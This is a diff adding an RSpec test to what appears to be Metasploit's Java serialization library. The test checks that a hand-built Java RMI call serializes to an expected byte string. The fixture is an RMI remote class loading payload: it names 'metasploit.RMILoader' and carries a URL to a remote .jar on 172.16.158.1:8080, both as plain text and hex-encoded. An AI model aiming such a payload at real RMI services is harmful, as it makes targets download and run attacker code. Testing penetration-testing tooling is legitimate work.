@@ -116,6 +116,21 @@ describe Rex::Java::Serialization::Model::Stream do
     EOS
   }
 
+  let(:rmi_call) do
+    "\xac\xed\x00\x05\x77\x22\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00" +
+    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
+    "\xf6\xb6\x89\x8d\x8b\xf2\x86\x43\x75\x72\x00\x18\x5b\x4c\x6a\x61" +
+    "\x76\x61\x2e\x72\x6d\x69\x2e\x73\x65\x72\x76\x65\x72\x2e\x4f\x62" +
+    "\x6a\x49\x44\x3b\x87\x13\x00\xb8\xd0\x2c\x64\x7e\x02\x00\x00\x70" +
+    "\x78\x70\x00\x00\x00\x00\x77\x08\x00\x00\x00\x00\x00\x00\x00\x00" +
+    "\x73\x72\x00\x14\x6d\x65\x74\x61\x73\x70\x6c\x6f\x69\x74\x2e\x52" +
+    "\x4d\x49\x4c\x6f\x61\x64\x65\x72\xa1\x65\x44\xba\x26\xf9\xc2\xf4" +
+    "\x02\x00\x00\x74\x00\x30\x68\x74\x74\x70\x3a\x2f\x2f\x31\x37\x32" +
+    "\x2e\x31\x36\x2e\x31\x35\x38\x2e\x31\x3a\x38\x30\x38\x30\x2f\x35" +
+    "\x71\x4f\x45\x37\x59\x52\x76\x43\x32\x53\x62\x2f\x65\x49\x64\x45" +
+    "\x44\x70\x2e\x6a\x61\x72\x78\x70\x77\x01\x00"
+  end
+
   describe ".new" do
     it "Rex::Java::Serialization::Model::Stream" do
       expect(stream).to be_a(Rex::Java::Serialization::Model::Stream)
@@ -257,6 +272,68 @@ describe Rex::Java::Serialization::Model::Stream do
       it "reserializes the original stream" do
         stream.decode(complex_stream_io)
         expect(stream.encode.unpack("C*")).to eq(complex_stream.unpack("C*"))
+      end
+    end
+
+    context "when serializing a Java RMI call" do
+      it "serializes the stream correctly" do
+        block_data = Rex::Java::Serialization::Model::BlockData.new
+        block_data.contents = "\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xf6\xb6\x89\x8d\x8b\xf2\x86\x43"
+        block_data.length = block_data.contents.length
+
+        stream.contents << block_data
+
+        new_array_annotation = Rex::Java::Serialization::Model::Annotation.new
+        new_array_annotation.contents = [
+            Rex::Java::Serialization::Model::NullReference.new,
+            Rex::Java::Serialization::Model::EndBlockData.new
+        ]
+
+        new_array_super = Rex::Java::Serialization::Model::ClassDesc.new
+        new_array_super.description = Rex::Java::Serialization::Model::NullReference.new
+
+        new_array_desc = Rex::Java::Serialization::Model::NewClassDesc.new
+        new_array_desc.class_name =  Rex::Java::Serialization::Model::Utf.new(nil, '[Ljava.rmi.server.ObjID;')
+        new_array_desc.serial_version = 0x871300b8d02c647e
+        new_array_desc.flags = 2
+        new_array_desc.fields = []
+        new_array_desc.class_annotation = new_array_annotation
+        new_array_desc.super_class = new_array_super
+
+        array_desc = Rex::Java::Serialization::Model::ClassDesc.new
+        array_desc.description = new_array_desc
+
+        new_array = Rex::Java::Serialization::Model::NewArray.new
+        new_array.type = 'java.rmi.server.ObjID;'
+        new_array.values = []
+        new_array.array_description = array_desc
+
+        stream.contents << new_array
+        stream.contents << Rex::Java::Serialization::Model::BlockData.new(nil, "\x00\x00\x00\x00\x00\x00\x00\x00")
+
+        new_class_desc = Rex::Java::Serialization::Model::NewClassDesc.new
+        new_class_desc.class_name = Rex::Java::Serialization::Model::Utf.new(nil, 'metasploit.RMILoader')
+        new_class_desc.serial_version = 0xa16544ba26f9c2f4
+        new_class_desc.flags = 2
+        new_class_desc.fields = []
+        new_class_desc.class_annotation = Rex::Java::Serialization::Model::Annotation.new
+        new_class_desc.class_annotation.contents = [
+          Rex::Java::Serialization::Model::Utf.new(nil, 'http://172.16.158.1:8080/5qOE7YRvC2Sb/eIdEDp.jar'),
+          Rex::Java::Serialization::Model::EndBlockData.new
+        ]
+        new_class_desc.super_class = Rex::Java::Serialization::Model::ClassDesc.new
+        new_class_desc.super_class.description = Rex::Java::Serialization::Model::NullReference.new
+
+        new_object = Rex::Java::Serialization::Model::NewObject.new
+        new_object.class_desc = Rex::Java::Serialization::Model::ClassDesc.new
+        new_object.class_desc.description = new_class_desc
+        new_object.class_data = []
+
+        stream.contents << new_object
+
+        stream.contents << Rex::Java::Serialization::Model::BlockData.new(nil, "\x00")
+
+        expect(stream.encode).to eq(rmi_call)
       end
     end
   end
